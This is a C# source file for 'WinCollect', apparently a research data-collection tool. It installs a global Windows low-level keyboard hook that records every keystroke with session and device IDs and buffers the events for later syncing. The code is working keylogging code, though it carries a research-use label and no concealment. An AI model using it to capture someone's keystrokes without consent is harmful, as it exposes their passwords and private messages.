using System.Runtime.InteropServices;
using Serilog;
using WinCollect.Infrastructure;
using WinCollect.Models;

namespace WinCollect.Services;

/// <summary>
/// Installs a global (system-wide) low-level keyboard hook using Windows API.
/// Captures all key events while monitoring is active.
/// NOTE: For research/education use only.
/// </summary>
public sealed class KeyboardHookService : IDisposable
{
    // Win32 hook constants
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_KEYUP = 0x0101;
    private const int WM_SYSKEYDOWN = 0x0104;
    private const int WM_SYSKEYUP = 0x0105;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern nint SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, nint hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(nint hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern nint CallNextHookEx(nint hhk, int nCode, nint wParam, nint lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern nint GetModuleHandle(string lpModuleName);

    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT
    {
        public uint vkCode;
        public uint scanCode;
        public uint flags;
        public uint time;
        public nint dwExtraInfo;
    }

    private delegate nint LowLevelKeyboardProc(int nCode, nint wParam, nint lParam);

    private nint _hookId = nint.Zero;
    private LowLevelKeyboardProc? _hookCallback;
    private int _sequenceCounter = 0;
    private readonly List<KeyEvent> _eventBuffer = new();
    private readonly object _bufferLock = new();

    public event EventHandler<KeyEvent>? KeyEventCaptured;
    public bool IsActive { get; private set; }

    public void Start()
    {
        if (IsActive) return;

        _sequenceCounter = 0;
        _hookCallback = HookCallback;

        using var curProcess = System.Diagnostics.Process.GetCurrentProcess();
        using var curModule = curProcess.MainModule!;
        _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _hookCallback,
            GetModuleHandle(curModule.ModuleName!), 0);

        if (_hookId == nint.Zero)
        {
            var err = Marshal.GetLastWin32Error();
            Log.Error("Failed to install keyboard hook. Win32 error: {Error}", err);
            throw new InvalidOperationException($"Failed to install keyboard hook. Error: {err}");
        }

        IsActive = true;
        Log.Information("Global keyboard hook installed");
    }

    public void Stop()
    {
        if (!IsActive) return;
        if (_hookId != nint.Zero)
        {
            UnhookWindowsHookEx(_hookId);
            _hookId = nint.Zero;
        }
        IsActive = false;
        Log.Information("Global keyboard hook removed");
    }

    private nint HookCallback(int nCode, nint wParam, nint lParam)
    {
        if (nCode >= 0 && AppState.IsMonitoring)
        {
            var kbInfo = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
            var vkCode = (System.Windows.Forms.Keys)kbInfo.vkCode;

            string eventType = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
                ? "KEY_DOWN" : "KEY_UP";

            var ev = new KeyEvent
            {
                EventId = Guid.NewGuid().ToString("N"),
                SessionId = AppState.CurrentSessionId ?? "unknown",
                DeviceId = AppState.DeviceId ?? "unknown",
                Sequence = Interlocked.Increment(ref _sequenceCounter),
                Timestamp = DateTime.UtcNow,
                EventType = eventType,
                Key = GetKeyName(vkCode),
                SyncStatus = "PENDING"
            };

            lock (_bufferLock)
            {
                _eventBuffer.Add(ev);
            }

            KeyEventCaptured?.Invoke(this, ev);
        }

        return CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    public List<KeyEvent> FlushBuffer()
    {
        lock (_bufferLock)
        {
            var copy = new List<KeyEvent>(_eventBuffer);
            _eventBuffer.Clear();
            return copy;
        }
    }

    private static string GetKeyName(System.Windows.Forms.Keys key)
    {
        return key switch
        {
            System.Windows.Forms.Keys.Space       => "Space",
            System.Windows.Forms.Keys.Return      => "Enter",
            System.Windows.Forms.Keys.Back        => "Backspace",
            System.Windows.Forms.Keys.Tab         => "Tab",
            System.Windows.Forms.Keys.Escape      => "Esc",
            System.Windows.Forms.Keys.Delete      => "Delete",
            System.Windows.Forms.Keys.Insert      => "Insert",
            System.Windows.Forms.Keys.Home        => "Home",
            System.Windows.Forms.Keys.End         => "End",
            System.Windows.Forms.Keys.Prior       => "PageUp",
            System.Windows.Forms.Keys.Next        => "PageDown",
            System.Windows.Forms.Keys.Left        => "Left",
            System.Windows.Forms.Keys.Right       => "Right",
            System.Windows.Forms.Keys.Up          => "Up",
            System.Windows.Forms.Keys.Down        => "Down",
            System.Windows.Forms.Keys.LShiftKey
            or System.Windows.Forms.Keys.RShiftKey   => "Shift",
            System.Windows.Forms.Keys.LControlKey
            or System.Windows.Forms.Keys.RControlKey => "Ctrl",
            System.Windows.Forms.Keys.LMenu
            or System.Windows.Forms.Keys.RMenu       => "Alt",
            System.Windows.Forms.Keys.LWin
            or System.Windows.Forms.Keys.RWin        => "Win",
            System.Windows.Forms.Keys.Capital        => "CapsLock",
            _ when key >= System.Windows.Forms.Keys.F1  &&
                   key <= System.Windows.Forms.Keys.F24  => key.ToString(),
            _ when key >= System.Windows.Forms.Keys.D0  &&
                   key <= System.Windows.Forms.Keys.D9   =>
                        ((char)('0' + key - System.Windows.Forms.Keys.D0)).ToString(),
            _ when key >= System.Windows.Forms.Keys.A   &&
                   key <= System.Windows.Forms.Keys.Z    => key.ToString(),
            _ => key.ToString()
        };
    }

    public void Dispose() => Stop();
}
